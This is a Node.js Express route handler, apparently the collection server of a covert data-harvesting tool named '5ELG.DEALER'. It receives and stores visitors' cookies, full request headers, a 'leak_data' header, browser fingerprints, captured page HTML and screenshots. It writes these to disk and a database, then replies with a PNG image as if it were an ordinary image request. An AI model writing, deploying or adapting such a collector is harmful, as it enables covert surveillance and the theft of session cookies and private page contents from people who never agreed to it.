const express = require('express');
const router = express.Router();
const { Log } = require('../Functions/db'); // Modelo Sequelize
const fs = require('fs');
const path = require('path');

// Define las funciones web dentro del objeto `webfuncs`
const webfuncs = {
    dealer: async (req, res) => {
         var ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || '';
         var userAgent = req.body.Ua || req.headers['user-agent'] || '';

         // Obtener los parámetros del request
         var fpUser = req.body.u || ''; // Parámetro "u"
         var fpBrowser = req.body.b || ''; // Parámetro "b"
         var fpRequest = req.body.r || ''; // Parámetro "r"
         var jsData = req.body.data || ''; // Datos JS
         var encodedPage = req.body.code || ''; // Página codificada
         var encodedScr = req.body.s || ''; // Captura de pantalla codificada
         var rts = req.body.ts || '';

         // Obtener las cookies
         var cookies = {};
         (req.cookies || []).forEach((cookie) => {
             cookies[cookie.name] = cookie.value;
         });

        // Decodificar y procesar el objeto `encoded_req` si existe
        var requestData;
        if (req.body.encoded_req) {
            try {
                
                requestData = JSON.parse(req.body.encoded_req);
            } catch (error) {
                console.error('[!] Error decoding encoded_req:', error.message);
                res.status(400).send('Invalid encoded_req format');
                return;
            }
        } else {
            requestData = {
                headers: req.headers, // Todas las cabeceras de la petición
                cookies: cookies, // Cookies obtenidas
                requestURL: req.originalUrl || req.url, // URL de la petición
                method: req.method, // Método HTTP (GET, POST, etc.)
                dealer_uri: req.headers['origin'] || '', // Origen de la petición
                merca_uri: req.headers['referer'] || '', // Referer (si está disponible)
                leak_data: req.headers['5elg'] || '', // Custom header for leak data (if available)
            };
        }
         // Codificar la información de la petición en Base64
         var encodedReq = Buffer.from(JSON.stringify(requestData)).toString('base64');

        var detectdata = false;
        // Si es una solicitud GET normal, devolver el archivo HTML
        if (req.method === 'GET') {
            var filePath = path.join(__dirname, '../Web/merca.html'); // Ruta del archivo HTML
            fs.readFile(filePath, 'utf8', (err, data) => {
                if (err) {
                    console.error('[!] Error al leer el archivo HTML:', err.message);
                    res.status(500).send('ERROR'); // Respuesta con error 500
                    return;
                }

                res.status(200).send(data); // Enviar el contenido del archivo HTML
            });
            return;
        }

        if (req.path.endsWith('.png')) {        
            detectdata = true;
        } 
        
        if (req.method === 'POST') {
            detectdata = true;  
        } 

        if (detectdata) {
           
            // Guardar archivos si es necesario
            const screenshotsDir = path.join(__dirname, '../Sources/screenshotsB64');
            if (!fs.existsSync(screenshotsDir)) {
                fs.mkdirSync(screenshotsDir, { recursive: true });
            }

            if (encodedScr) {
                fs.writeFileSync(path.join(screenshotsDir, `${fpRequest}.shot`), encodedScr, 'utf8');
            }

            if (encodedPage) {
                fs.writeFileSync(path.join(screenshotsDir, `${fpRequest}.code`), encodedPage, 'utf8');
            }


            // Loguear o procesar los datos según sea necesario
            const newLog = {
                Dl: '5ELG.DEALER',
                Ed: jsData, // JavaScript data
                Er: encodedReq, // Encoded request data
                Ts: rts,
                Ip: ip,
                Ua: userAgent,
                Fu: fpUser,
                Fb: fpBrowser,
                Fr: fpRequest,
                Jd: jsData,
                Html: encodedPage,
                Screen: encodedScr,
            };

            Log.create(newLog) // Asegúrate de que `Log` sea el modelo Sequelize correcto
                .then(() => {
                    console.log('[5ELG-DEALER] Fingerprinted request for '+fpUser+' Timestamp: '+rts);
                })
                .catch((err) => {
                    console.error('[5ELG-DEALER] Error al guardar los datos:', err);
                });
        }
        res.setHeader('Content-Type', 'image/png');
        const imagePath = path.join(__dirname, '../Web/assets/img/1.png');
        return res.sendFile(imagePath, (err) => {
            if (err) {
                console.error('[DealerHandler] Error al enviar el archivo PNG:', err.message);
                res.status(500).send('Error al enviar la imagen');
            }
        });
    }
}

router.use('/', webfuncs.dealer);  

module.exports = router;
